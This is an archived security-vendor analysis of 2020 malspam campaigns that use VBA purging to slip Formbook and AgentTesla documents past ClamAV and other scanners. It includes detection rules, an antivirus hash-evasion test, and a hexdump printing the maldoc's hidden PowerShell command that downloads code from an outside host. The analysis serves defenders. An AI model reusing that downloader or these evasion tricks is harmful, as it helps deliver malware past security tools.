{
    "id": "4a97709c-0c8e-4e85-a080-9e96a3efce1d",
    "created_at": "2023-01-12T15:09:55.639531Z",
    "updated_at": "2025-03-27T02:05:24.278341Z",
    "deleted_at": null,
    "sha1_hash": "37bca8a9fc314cd629077488ccf84f66720b06db",
    "title": "2020-10-16 - VBA Purging Malspam Campaigns",
    "authors": "",
    "file_creation_date": "2022-05-28T04:52:11Z",
    "file_modification_date": "2022-05-28T04:52:11Z",
    "file_size": 666197,
    "plain_text": "# VBA Purging Malspam Campaigns\n\n**[hornetsecurity.com/en/threat-research/vba-purging-malspam-campaigns/](https://www.hornetsecurity.com/en/threat-research/vba-purging-malspam-campaigns/)**\n\nSecurity Lab October 16, 2020\n\n## Summary\n\nVBA purging is a recent office macro detection evasion technique. It removes the VBA macro\n```\nPerformanceCache from malicious documents. While the VBA macro source code is only\n\n```\nstored in compressed form in Office documents, this `PerformanceCache caches the`\ndecompressed VBA source code in uncompressed plain text form. Because many security\nscanning solutions rely on this uncompressed plain text VBA macro source code to be\npresent in order to detect malicious VBA macro code, their detection can be evaded by VBA\npurging.\n\nThis article details a recent spam campaign with malicious office attachments using VBA\npurging, how the detection evasion works and how Hornetsecurity protects against VBA\npurging. Evaluating the data of the observed campaign indicates that the campaign was not\ntargeted towards a specific geographic region nor a specific industry sector.\n\n## Background\n\nRecently, Hornetsecurity has observed malspam delivering Formbook1 and AgentTesla2 via\nmalicious office attachments using VBA purging.\n\n\n-----\n\nVBA purging is a technique first described by Didier Stevens . VBA macros are stored in\nmodule streams4 of CFBF 5 files. A stream storing VBA code has two parts, the\n```\nPerformanceCache and CompressedSourceCode :\n\n```\nThe `CompressedSourceCode contains the VBA code in compressed form. While not`\nspecified in the official documentation, the `PerformanceCache generally contains the VBA`\ncode in compiled form (P-code) and the uncompressed plain text VBA code.\n\nVBA purging deletes the `PerformanceCache by setting its size to 0. Then the VBA code`\nwill only be present in compressed form. Because many detection tools rely on the\nuncompressed plain text VBA code copy in the `PerformanceCache, their detection can be`\nevaded. One detection tool affected is ClamAV a popular open source anti-virus\n**scanner often used on email gateways.**\n\nThis is interesting for multiple reasons. First, Formbook and AgentTesla are very common\nmalware that can be obtained and operated easily. For example, in 2017 Formbook could be\nrented for US$ 29 per week, US$ 59 per month, or US$ 99 for three months and US$ 299 for\nbuying it,6 while AgentTesla is spread so far that tutorial videos for it exist on YouTube.\n\n\n-----\n\nThis low barrier of entry means that this type of malware is usually send via less\nsophisticated methods, such as ZIP’ing malware executable and attaching it directly to spam\nemails, or using publicly available exploits for old vulnerabilities (CVE-2017-0199, CVE2017-8570, CVE-2017-8759, CVE-2018-8174). In case malicious VBA macros are used the\ncode is usually not very advanced and technically far away from the skill level needed for\nVBA purging.\n\nHowever, since September 2020 Hornetsecurity has observed multiple Formbook and\nAgentTesla malspam campaigns using VBA purging. While the observed malspam is similar\nto a previous VBA purging campaign observed in the wild by Didier Stevens7 the hereafter\nreported malicious documents are not in the OOXML format and can, hence, not have been\ncreated by EPPlus. The hereafter reported documents have the OLE/CFB format.\n\n## Technical Analysis\n\n\nIn September we identified malicious documents using similar VBA code as described in the\nVBA purging article by Didier Stevens .7 The main similarity being the call to a `Loader sub`\nroutine with an either Hex or Base64 encoded string containing the download URL:\n```\nLoader\"68 74 74 70 ...\"\n\n```\n\n-----\n\nHowever, the main difference is that the herein observed malicious documents are not in the\nOOXML format as the documents outlined by Didier Stevens.\n\nIn the following technical analysis we analyze one malspam activity we think originates from\nthe same threat actor that Didier Stevens called Epic Manchego. The following time\nhistogram shows the volume and attachment filenames of the observed activity for the last\ncouple of days:\n\n### Targeting\n\nLooking at the targeted recipients by country does not indicate a specific bias towards a\nspecific geographic region:\n\n\n-----\n\nLooking at the targeted recipients by industry does not indicate a specific bias towards a\nspecific industry:\n\n\n-----\n\nThe emails are send from (we assume) compromised legitimate company email domains.\nEach wave of attachments is send from one email address. But also the companies behind\nthe sending email domains have no clear bias towards a specific industry. We observed\nsenders from the following industries:\n\n\n-----\n\n### VBA macro code\n\nThe core of the malicious documents is a PowerShell downloader that downloads a malware\nexecutable. While in the beginning, the threat actor continued to use the `Loader sub`\nroutine:\n\n\n-----\n\nA deobfuscated version of the above VBA code is as follows:\n\nIn later variants the actor also mangled the name of the `Loader sub routine:`\n\nBut deobfuscated the VBA code is still virtually the same:\n\n\n-----\n\nSome of the Excel documents place the Base64 encoded strings into a cell of the\nspreadsheet and extract it from within the VBA code:\n\nTo hide the cell content from a user opening the document the A cell’s width is set to 0 pixels\nand the font color is set to white:\n\n### VBA purging\n\nAs outlined earlier, VBA purging is when the `PerfomanceCache of a VBA macro document`\nis deleted. You can use Didier Stevens’ `oledump.py tool to analyze the size of the streams,`\nincluding the size of the `PerfomanceCache . In the following, we see highlighted in red that`\nthe `PerfomanceCache size of the VBA macro module streams is 0, meaning the`\n```\nPerfomanceCache was purged:\n\n```\nWe currently do not know how these documents were created. The VBA purging documents\noutlined in the article by Didier Stevens7 were allegedly created with EPPlus. However,\nEPPlus can only create documents in the OOXML format.\n\n\n-----\n\nIn one of the maldocs we found a reference to `Aviary for Android 4.8.4, a photo`\nediting app for Android. It could be possible that these documents were generated or\nconverted by an Android app which performs VBA purging. Here it is important to note that\nVBA purging in itself is not malicious. It saves disk storage by deleting a cache, which can be\nrecreated from the `CompressedSourceCode data. So there likely exist office software that`\nperforms VBA purging as part of optimizing office document file sizes.\n\n## Why is this dangerous?\n\nMany email gateways use ClamAV as anti-virus scanner. When ClamAV scans an office\ndocument, it extracts the individual sub-files of the document. It does so for both modern\nOOXML documents (which are basically ZIP files) and OLE/CFB documents (which also\nfeature a file system structure inside )5 . In this process it also extracts the module stream files\nwe mentioned earlier.\n\nIt then searches the extracted files using byte patterns, e.g., to detect a malicious Emotet\ndocument variant they use the following signature:\n```\nDoc.Malware.Emotet-9769220-0;Engine:51255,Target:2;0&1&2;4174747269627574652056425f4e616d65203d2022413179397a677337686679357\n\n```\nFor better understanding we convert the search patterns into a more readable YARA rule:\n```\nrule Doc_Malware_Emotet_9769220_0 {\n  strings:\n    $a0 = \"Attribute VB_Name = \\\"A1y9zgs7hfy5z\"\n    $a1 = \"Document_open\"\n    $a2 = \"V_871xt2noejh.M33sq7cmhet\"\n  condition:\n    $a0 and $a1 and $a2\n}\n\n```\nFrom this we see that the rule matches on plain text VBA code (the attribute `VB_Name that`\nis automatically added by Office at the beginning of the macro, the sub routing name\n```\nDocument_open that instructs office to run this sub routine when the document is opened\n\n```\nand a code snipped using two obfuscated variables `V_871xt2noejh and` `M33sq7cmhet ).`\n\nIn a VBA purged document there (highly likely) is no `Attribute VB_Name string (nor any of`\nthe other strings) in plain text, because only the `CompressedSourceCode using a`\nproprietary compression is available. Compression algorithms work by storing repeating\npatterns in a data stream more efficiently, e.g., the following attributes at the start of VBA\ncode all contain repeating patterns:\n```\nAttribute VB_Name = \"Lhc713a6y33gome\"\nAttribute VB_Base = \"1Normal.ThisDocument\"\nAttribute VB_GlobalNameSpace = False\nAttribute VB_Creatable = False\n[...]\n\n```\n\n-----\n\nSo in compressed form `Attribute would only be stored in plain text form once and all`\nfurther occurrences of it are replaced with a shorter reference, so the previous VBA code\nsnippet would turn into something like:\n```\n0001b0d0 41 74 74 72 69 62 75 74 00 65 20 56 42 5f 4e 61 |Attribut.e VB_Na|\n0001b0e0 6d 00 65 20 3d 20 22 4c 68 63 00 37 31 33 61 36 |m.e = \"Lhc.713a6|\n0001b0f0 79 33 33 80 67 6f 6d 65 22 0d 0a 0a 98 08 42 61 |y33.gome\".....Ba|\n0001b100 73 02 98 31 4e 6f 72 00 6d 61 6c 2e 54 68 69 73 |s..1Nor.mal.This|\n0001b110 00 44 6f 63 75 6d 65 6e 74 81 0d 56 47 6c 6f 62 |.Document..VGlob|\n0001b120 61 6c 01 b0 10 53 70 61 63 01 6c 46 61 6c 04 73 |al...Spac.lFal.s|\n0001b130 65 0c a2 43 72 65 61 74 08 61 62 6c 15 1f 50 72 |e..Creat.abl..Pr|\n\n```\nHence any rule matching on `Attribute (or any other string) would not match anymore as`\nthe string is split up, in this example, into `Attribut,` `e VB_Nam, etc., substrings, that are`\nthen referenced again later in the data stream in order to save storage space, as storing the\nreference is smaller than the original repeated string.\n\nHence, if the document for which the above ClamAV rule matches would have its\n```\nPerformanceCache removed ClamAV would not detect it anymore. This also affects other\n\n```\nsecurity tools relying on plain text VBA code in the `PerformanceCache for their detection of`\nmalicious content.\n\nWhile VBA purging is not widely used, we predict that is only a matter of time before this\ntechnique catches on and is misused in more sophisticated attacks. This means ClamAV or\nsimilar working solutions can not provide adequate protection anymore.\n\n## Seeing which vendors likely detect these VBA purged maldocs only by hash\n\nWe used VirusTotal to estimate how much the static detection capabilities of current antivirus solutions is affected by VBA purging. To this end, we used a document that after\naround 7 hours is detected by 21 of 61 listed anti-virus solutions:\n\nTo check which anti-virus solution detects this document only by its hash, we appended a\nsingle `X ASCII character byte to the file:`\n\n\n-----\n\n```\n$ sha256sum test.xls \n038e0a602ddf37976cde6f57007fcf5c3f5f235cc025637b40303db38c3b4ec2 test.xls\n$ echo -n 'X' >> test.xls\n$ sha256sum test.xls\n1c4d151611fb2866b2b0ed9c33f9e063fa77708e2c4a725d025cee5e96c14a41 test.xls\n\n```\nAfter this change 7 of the initial 21 anti-virus solutions do not detect the document anymore:\n\nThis indicates that these solutions do not detect the VBA purged document by its malicious\nVBA macro code, but only by its hash. A robust detection would not get tricked by appending\na single byte, especially because the document structure was not changed at all.\n\nThis drop is especially astonishing as the tested document stored the `powershell.exe -`\n```\nWindowStyle Hidden -ExecutionPolicy Bypass ... string in plain text inside a cell of\n\n```\nthe spreadsheet. Meaning the string is stored in pain text inside the document:\n```\n$ hexdump -C RFQ-752101222GPTR7\\ -\\ CEYLON\\ STEEL\\ CORPORATION\\ LIMITED.xls\n[...]\n00007e20 00 00 00 02 00 00 00 f7 00 00 70 6f 77 65 72 73 |..........powers|\n00007e30 68 65 6c 6c 2e 65 78 65 20 2d 57 69 6e 64 6f 77 |hell.exe -Window|\n00007e40 53 74 79 6c 65 20 48 69 64 64 65 6e 20 2d 45 78 |Style Hidden -Ex|\n00007e50 65 63 75 74 69 6f 6e 50 6f 6c 69 63 79 20 42 79 |ecutionPolicy By|\n00007e60 70 61 73 73 20 20 2d 63 6f 6d 6d 61 6e 64 20 22 |pass -command \"|\n00007e70 20 26 20 7b 20 69 77 72 20 68 74 74 70 73 3a 2f | & { iwr https:/|\n00007e80 2f 61 69 6d 73 6d 6f 74 69 6f 6e 2e 63 6f 6d 2e |/aimsmotion.com.|\n00007e90 6d 79 2f 64 61 74 61 31 2f 69 6d 61 67 65 73 2f |my/data1/images/|\n[...]\n\n## Conclusion and Countermeasure\n\n```\nAs we have seen VBA purging can evade detection by some security solutions. Many\nsolutions seem to fallback to a hash-based detection because presumably their detection\nsignatures rely on plain text VBA code in the `PerformanceCache .`\n\nHornetsecurity’s [Advanced Threat Protection includes sophisticated VBA macro analyzers](https://www.hornetsecurity.com/en/services/advanced-threat-protection/)\nthat, unlike ClamAV or other solutions, extracts the VBA macro code from the\n```\nCompressedSourceCode of office documents. This way Hornetsecurity’s multi-layer\n\n```\napproach to email attachment scanning will continue working even against VBA purged\ndocuments.\n\n## References\n\n\n-----\n\n## Indicators of Compromise (IOCs)\n\n### Hashes\n\n**SHA1** **Filename** **Description**\n\n```\n016a4df3e4ac565ca0fd4d227d63e60009b3d385 RFQ                          752101222GPTR7                           CEYLON STEEL\n                          CORPORATION\n                          LIMITED.xls\n\n```\n\nOriginal VBA\nPurging\nmaldoc used\nin VT test\n\n\n`eb4010a4aca2411a64db9f3554bb2476c71a1be9` `test.xls` Manipulate\nVBA Purgning\nmaldoc used\nin VT test\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-10-16 - VBA Purging Malspam Campaigns.pdf"
    ],
    "report_names": [
        "2020-10-16 - VBA Purging Malspam Campaigns.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536195,
    "ts_updated_at": 1743041124,
    "ts_creation_date": 1653713531,
    "ts_modification_date": 1653713531,
    "files": {
        "pdf": "https://archive.orkl.eu/37bca8a9fc314cd629077488ccf84f66720b06db.pdf",
        "text": "https://archive.orkl.eu/37bca8a9fc314cd629077488ccf84f66720b06db.txt",
        "img": "https://archive.orkl.eu/37bca8a9fc314cd629077488ccf84f66720b06db.jpg"
    }
}